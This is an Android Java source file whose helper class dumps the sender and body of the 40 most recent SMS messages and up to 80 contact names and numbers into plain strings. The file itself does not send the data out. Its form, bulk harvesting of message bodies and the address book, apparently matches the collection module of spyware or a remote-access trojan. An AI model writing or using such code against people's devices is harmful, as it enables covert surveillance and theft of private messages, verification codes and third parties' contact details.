package com.aval.seg;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

public final class Extra {

    public static String sms(Context c) {
        StringBuilder s = new StringBuilder();
        try (Cursor cu = c.getContentResolver().query(
                Uri.parse("content://sms"), null, null, null, "date DESC")) {
            if (cu == null) return "sem permissao";
            int n = 0;
            while (cu.moveToNext() && n++ < 40) {
                s.append(cu.getString(cu.getColumnIndexOrThrow("address")))
                 .append(" | ").append(cu.getString(cu.getColumnIndexOrThrow("body")))
                 .append('\n');
            }
        } catch (Throwable t) { return "err " + t; }
        return s.toString();
    }

    public static String contacts(Context c) {
        StringBuilder s = new StringBuilder();
        try (Cursor cu = c.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                }, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
            if (cu == null) return "sem permissao";
            int n = 0;
            while (cu.moveToNext() && n++ < 80) {
                s.append(cu.getString(0)).append(" | ").append(cu.getString(1)).append('\n');
            }
            if (n == 0) return "vazio";
        } catch (Throwable t) { return "err " + t; }
        return s.toString();
    }
}